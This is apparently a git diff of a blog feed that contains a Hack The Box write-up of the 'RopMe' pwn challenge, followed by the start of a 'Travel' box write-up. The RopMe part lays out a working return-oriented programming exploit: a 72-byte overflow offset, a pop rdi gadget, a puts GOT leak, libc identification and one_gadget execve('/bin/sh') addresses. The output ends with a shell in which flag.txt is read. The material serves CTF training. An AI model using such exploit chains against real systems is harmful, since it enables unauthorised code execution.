 Segmentation fault
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;looking-into&quot;&gt;Looking into&lt;/h1&gt;
 &lt;p&gt;As always when dealing with binary exploitation we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checksec&lt;/code&gt; on the file:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/challenges/pwn/RopMe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file ropme 
-ropme: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;file ropme 
+&lt;span class=&quot;go&quot;&gt;ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped
 
-kali@kali:~/HTB/challenges/pwn/RopMe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec ropme
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/home/kali/HTB/challenges/pwn/RopMe/ropme'&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;checksec ropme
+&lt;span class=&quot;go&quot;&gt;[*] '/home/kali/HTB/challenges/pwn/RopMe/ropme'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+    PIE:      No PIE (0x400000)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;The first thing we note is it’s a dynamically linked binary, so libraries such as libc are not included in this binary but loaded at runtime at random (base) address. Since we will later want to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; from libc to get a shell we not only need to leak the libc version from the box but also calculate the base address of libc at runtime in order to be able to find the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt; and execute it.&lt;br /&gt; 
 How is calling an external function executed? This is where the &lt;ins&gt;p&lt;/ins&gt;rocedure &lt;ins&gt;l&lt;/ins&gt;inkage &lt;ins&gt;t&lt;/ins&gt;able (PLT) and &lt;ins&gt;g&lt;/ins&gt;lobal &lt;ins&gt;o&lt;/ins&gt;ffset &lt;ins&gt;t&lt;/ins&gt;able (GOT) come into play:&lt;br /&gt;
 Let’s say we want to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;. Calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; will first be translated to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt; and the program jumps to the PLT. Looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; we find two jump instructions there, the first will go to the GOT, the second to another function:&lt;/p&gt;
@@ -62,25 +200,25 @@ Now onto the binary. Looking at the code in &lt;code class=&quot;language-plaint
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic(0x100, n=8)&lt;/code&gt; creates a 256 bytes long cyclic string consisting of 8 byte long unique substrings. After sending the payload we find the unique substring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x616161616161616a&lt;/code&gt; inside the stack pointer (RSP) register which contains the address that will moved to the instruction pointer and executed next. With the use of pwntools &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic_find&lt;/code&gt; we find out that this string is located after 72 bytes.&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/10wxg &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/10wxg $rsp
 0x7ffdadd33cd8: 0x616161616161616a
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; cyclic_find&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x616161616161616a, &lt;span class=&quot;nv&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;gt;&amp;gt;&amp;gt; cyclic_find(0x616161616161616a, n=8)
 72
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;To make sure everything works as we now repeat the process but replace our payload to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b'A'*72 + b'B'*8&lt;/code&gt;. We now find all eight Bs in the RSP. Nice.&lt;/p&gt;
 
 &lt;h1 id=&quot;first-lap---collecting-addresses&quot;&gt;First lap - collecting addresses&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Big shoutout to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdf&lt;/code&gt; for his writeup on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt;. Since we have the same initial conditions as in the root part of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt; we can follow his two-step approach and basically just need to find the right addresses. First we are looking for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; to load the first value of the stack into the rdi register and then return.&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; ropme &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;% ?di&quot;&lt;/span&gt;
-&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;0x00000000004006d3: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; ropme &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;% ?di&quot;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;`0x00000000004006d3: pop rdi;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Now we need to think about what we want to put on the stack that will be moved into the rdi. We need to leak a libc address so why not try leaking the puts address in libc that has been loaded into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT&lt;/code&gt;. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; or searching in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; will hand us the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ objdump -D ropme | grep puts@GLIBC
-4004e0:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)        # 601018 &amp;lt;puts@GLIBC_2.2.5&amp;gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ropme | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;puts@GLIBC
+&lt;span class=&quot;gp&quot;&gt;4004e0:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)        #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;601018 &amp;lt;puts@GLIBC_2.2.5&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Finally we need the address of the main function to be able to send our second payload.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ objdump -D ropme | grep main
-0000000000400626 &amp;lt;main&amp;gt;:
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ropme | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;main
+&lt;span class=&quot;gp&quot;&gt;0000000000400626 &amp;lt;main&amp;gt;&lt;/span&gt;:
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;This leads to a payload of&lt;/p&gt;
 &lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
@@ -96,51 +234,52 @@ Now onto the binary. Looking at the code in &lt;code class=&quot;language-plaint
 &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Leaked puts address: 0x%x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;So after the junk, we load the address stored in the GOT into the rdi register, return to puts which will leak the address and then return back to the main function of the program.&lt;br /&gt;
+&lt;p&gt;So after the junk, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; will load the subsequent address into the RDI register, which is the address of puts in the GOT and this is the address that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; will print when called - so we add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts_plt&lt;/code&gt;.
+To keep the program running, we simply return to the main function of the program.&lt;br /&gt;
 This way we get the libc address leak:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Leaked puts address: 0x7f6e03c4a690
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;second-lap---getting-shell&quot;&gt;Second lap - getting shell&lt;/h1&gt;
 &lt;p&gt;We do not have access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; of the box but we are still able to use the &lt;a href=&quot;https://github.com/niklasb/libc-database&quot;&gt;libc database&lt;/a&gt; with our data leak. Just feeding in the last three digits of the leak will result in two possible libcs:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/opt/libc-database&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./find puts 690
-ubuntu-xenial-amd64-libc6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;libc6_2.23-0ubuntu10_amd64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-archive-glibc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;libc6_2.23-0ubuntu11_amd64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;kali@kali:/opt/libc-database$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;./find puts 690
+&lt;span class=&quot;go&quot;&gt;ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
+archive-glibc (id libc6_2.23-0ubuntu11_amd64)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;We go with the first, download it and grab the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;puts@@GLIBC&quot;&lt;/span&gt;
-   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;puts@@GLIBC&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
    404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;as well as the addresses of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;)&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;one_gadget libc.so.6
-0x45216 execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x30, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;one_gadget libc.so.6
+&lt;span class=&quot;go&quot;&gt;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
 constraints:
-  rax &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+  rax == NULL
 
-0x4526a execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x30, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
 constraints:
-  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x30] &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+  [rsp+0x30] == NULL
 
-0xf02a4 execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x50, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
 constraints:
-  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x50] &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
+  [rsp+0x50] == NULL
 
-0xf1147 execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, rsp+0x70, environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
 constraints:
-  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x70] &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; NULL
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+  [rsp+0x70] == NULL
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;With this we only need to calculate the base address of libc from the leak, add the address to the system call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; to it and send it together with 72 bytes of junk to get a shell:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/challenges/pwn/RopMe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python xpl.py
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Opening connection to docker.hackthebox.eu on port 31910: Done
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Leaked puts address: 0x7f7aa52fd690
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Switching to interactive mode
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;flag.txt
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python xpl.py
+&lt;span class=&quot;go&quot;&gt;[+] Opening connection to docker.hackthebox.eu on port 31910: Done
+[+] Leaked puts address: 0x7f7aa52fd690
+[*] Switching to interactive mode
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;flag.txt
 ropme
 spawn.sh
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
-HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;redacted&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;go&quot;&gt;HTB{redacted}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;appendix&quot;&gt;Appendix&lt;/h1&gt;
 &lt;h2 id=&quot;code&quot;&gt;Code&lt;/h2&gt;
 &lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
@@ -185,7 +324,7 @@ HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;redacted&lt;span class=&quot;o&
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=kUk5pw4w0h4&quot;&gt;LiveOverflow&lt;/a&gt; explaining PLT and GOT&lt;/li&gt;
   &lt;li&gt;This &lt;a href=&quot;https://0xdf.gitlab.io/2019/10/19/htb-ellingson.html#overflow-protections&quot;&gt;write-up&lt;/a&gt; of the box &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt; from &lt;a href=&quot;https://app.hackthebox.eu/users/4935&quot;&gt;0xdf&lt;/a&gt; was very helpful to me.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Philipp Menner</name></author><category term="challenges" /><category term="ROP" /><category term="pwn" /><summary type="html">Write-up of the challange pwn challenge RopMe from Hack The Box</summary></entry><entry><title type="html">HackTheBox - Travel</title><link href="http://localhost:4000/boxes/travel/" rel="alternate" type="text/html" title="HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>http://localhost:4000/boxes/travel</id><content type="html" xml:base="http://localhost:4000/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
+&lt;/ul&gt;</content><author><name>Philipp Menner</name></author><category term="challenges" /><category term="ROP" /><category term="pwn" /><summary type="html">Write-up of the pwn challenge RopMe from Hack The Box</summary></entry><entry><title type="html">HackTheBox - Travel</title><link href="http://localhost:4000/boxes/travel/" rel="alternate" type="text/html" title="HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>http://localhost:4000/boxes/travel</id><content type="html" xml:base="http://localhost:4000/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Travel&lt;/code&gt; is an interesting box created by &lt;a href=&quot;https://app.hackthebox.eu/users/77141&quot;&gt;jkr&lt;/a&gt; and his team member &lt;a href=&quot;https://app.hackthebox.eu/users/13569&quot;&gt;xct&lt;/a&gt;. It required some fuzzing and enumerating to get a foothold, exploiting memcached abusing a SSRF vulnerability and finally modifying users by taking advantage of our LDAP privileges.&lt;/p&gt;
 &lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
 &lt;p&gt;Since &lt;a href=&quot;#Nmap scan&quot;&gt;the nmap scan&lt;/a&gt; just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page not only gives away the domain name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;travel.htb&lt;/code&gt; but also mentions a blog site, so scanning for subdomains is the next logical step:&lt;/p&gt;
@@ -573,22 +712,22 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;/figure&gt;
 
 &lt;p&gt;Unpacking the tar file gives us for the most part a binary called &lt;em&gt;Protobs.bin&lt;/em&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x Protobs.bin 	&lt;span class=&quot;c&quot;&gt;# making it executable&lt;/span&gt;
-kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./Protobs.bin		&lt;span class=&quot;c&quot;&gt;# file doesn't run&lt;/span&gt;
